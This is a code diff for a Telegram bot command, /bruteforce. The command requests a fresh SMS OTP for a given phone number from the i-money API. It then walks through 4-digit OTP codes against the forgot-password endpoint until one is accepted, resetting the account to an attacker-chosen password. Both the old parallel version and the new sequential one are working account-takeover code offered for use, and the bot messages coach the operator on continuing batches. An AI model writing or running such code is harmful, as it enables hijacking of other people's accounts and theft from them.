@@ -711,65 +711,66 @@ Example:
     else if (text.startsWith('/bruteforce ')) {
       const parts = text.substring(12).trim().split(/\s+/);
       if (parts.length < 2) {
-        await bot.sendMessage(chatId, `❌ Format: /bruteforce <phone> <newPassword> [startOtp] [4|6]\nExample: /bruteforce 6206785398 mypass123\n\nStep 1: First send OTP from app (click "Send OTP")\nStep 2: Immediately run this command\nOTP expires in ~60s so be fast!`);
+        await bot.sendMessage(chatId, `Format: /bruteforce <phone> <newPassword> [start] [batchSize]\nDefault: 4-digit, 20 per batch\nExample: /bruteforce 6206785398 mypass123\n/bruteforce 6206785398 mypass123 500 50`);
         return res.sendStatus(200);
       }
       const phone = parts[0];
       const newPass = parts[1];
       const startFrom = parseInt(parts[2] || '0');
-      const digits = parts[3] === '6' ? 6 : 4;
-      const maxOtp = digits === 6 ? 999999 : 9999;
-      const batchSize = 500;
-      const parallelSize = 20;
+      const batchSize = Math.min(parseInt(parts[3] || '20'), 100);
+      const maxOtp = 9999;
 
-      if (!savedForgetPassHeaders) {
-        await bot.sendMessage(chatId, `⚠️ No auth headers saved!\nFirst: Open app → Forgot Password → enter any OTP → click "Verify & Reset Password"\nThis saves auth headers.\nThen run /bruteforce again.`);
-        return res.sendStatus(200);
-      }
+      try {
+        await fetch(ORIGINAL_API + '/smsCode', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'host': 'api.i-money.vip' },
+          body: `phone=${encodeURIComponent(phone)}`
+        });
+      } catch(e) {}
 
-      await bot.sendMessage(chatId, `🔓 Brute force starting...\nPhone: ${phone}\nRange: ${String(startFrom).padStart(digits, '0')} → ${String(Math.min(startFrom + batchSize - 1, maxOtp)).padStart(digits, '0')}\n${digits}-digit | ${parallelSize} parallel | Using saved auth headers`);
+      await bot.sendMessage(chatId, `🔓 Brute force (sequential)\nPhone: ${phone}\nFresh OTP requested ✅\nRange: ${String(startFrom).padStart(4, '0')} → ${String(Math.min(startFrom + batchSize - 1, maxOtp)).padStart(4, '0')}\nBatch: ${batchSize} (one-by-one)`);
 
       let found = false;
       let foundOtp = '';
       let foundResp = '';
       let tried = 0;
-      let errors = 0;
+      let lastStatus = '';
 
-      for (let batch = startFrom; batch < startFrom + batchSize && batch <= maxOtp && !found; batch += parallelSize) {
-        const promises = [];
-        for (let j = 0; j < parallelSize && (batch + j) <= maxOtp; j++) {
-          const otp = String(batch + j).padStart(digits, '0');
-          const formBody = `phone=${encodeURIComponent(phone)}&smsCode=${encodeURIComponent(otp)}&newPassword=${encodeURIComponent(newPass)}`;
-          const hdrs = { ...savedForgetPassHeaders };
-          hdrs['content-type'] = 'application/x-www-form-urlencoded';
-          hdrs['content-length'] = String(Buffer.byteLength(formBody));
-          promises.push(
-            fetch(ORIGINAL_API + '/user/forgetPass', {
-              method: 'POST',
-              headers: hdrs,
-              body: formBody
-            }).then(r => r.json()).then(result => {
-              if (result.statusCode !== '1023') return { otp, result };
-              return null;
-            }).catch(e => { errors++; return null; })
-          );
-        }
-        const results = await Promise.all(promises);
-        tried += promises.length;
-        for (const r of results) {
-          if (r) { found = true; foundOtp = r.otp; foundResp = JSON.stringify(r.result, null, 2); break; }
+      for (let i = startFrom; i < startFrom + batchSize && i <= maxOtp && !found; i++) {
+        const otp = String(i).padStart(4, '0');
+        const formBody = `phone=${encodeURIComponent(phone)}&smsCode=${encodeURIComponent(otp)}&newPassword=${encodeURIComponent(newPass)}`;
+        try {
+          const resp = await fetch(ORIGINAL_API + '/user/forgetPass', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'host': 'api.i-money.vip' },
+            body: formBody
+          });
+          const result = await resp.json();
+          lastStatus = result.statusCode + ': ' + result.statusInfo;
+          tried++;
+          if (result.statusCode !== '1023') {
+            found = true;
+            foundOtp = otp;
+            foundResp = JSON.stringify(result, null, 2);
+          }
+          if (result.statusCode !== '1023' && result.statusCode !== '0') {
+            await bot.sendMessage(chatId, `⚠️ Unexpected response at OTP ${otp}:\n${JSON.stringify(result, null, 2).substring(0, 500)}`);
+            break;
+          }
+        } catch(e) {
+          await bot.sendMessage(chatId, `⚠️ Network error at OTP ${otp}: ${e.message}`);
+          break;
         }
       }
 
       if (found) {
-        await bot.sendMessage(chatId, `✅ OTP FOUND: ${foundOtp}\n🎉 Password changed!\n\nResponse:\n${foundResp.substring(0, 1000)}`);
+        await bot.sendMessage(chatId, `✅ OTP FOUND: ${foundOtp}\n🎉 Password changed to: ${newPass}\n\nResponse:\n${foundResp.substring(0, 1000)}`);
       } else {
         const nextStart = startFrom + batchSize;
-        const endTried = Math.min(startFrom + batchSize - 1, maxOtp);
         if (nextStart <= maxOtp) {
-          await bot.sendMessage(chatId, `❌ Not found: ${String(startFrom).padStart(digits, '0')}-${String(endTried).padStart(digits, '0')} (${tried} tried${errors ? ', ' + errors + ' errors' : ''})\n\n⚠️ OTP may have expired! Send new OTP first, then:\n/bruteforce ${phone} ${newPass} ${nextStart}${digits === 6 ? ' 6' : ''}`);
+          await bot.sendMessage(chatId, `❌ Not found: ${String(startFrom).padStart(4, '0')}-${String(Math.min(startFrom + batchSize - 1, maxOtp)).padStart(4, '0')} (${tried} tried)\nLast: ${lastStatus}\n\nContinue:\n/bruteforce ${phone} ${newPass} ${nextStart} ${batchSize}`);
         } else {
-          await bot.sendMessage(chatId, `❌ All ${digits}-digit OTPs exhausted (${tried} tried).\n${digits === 4 ? 'Try 6-digit:\n/bruteforce ' + phone + ' ' + newPass + ' 0 6' : 'Brute force failed.'}`);
+          await bot.sendMessage(chatId, `❌ All 4-digit OTPs exhausted.`);
         }
       }
       return res.sendStatus(200);
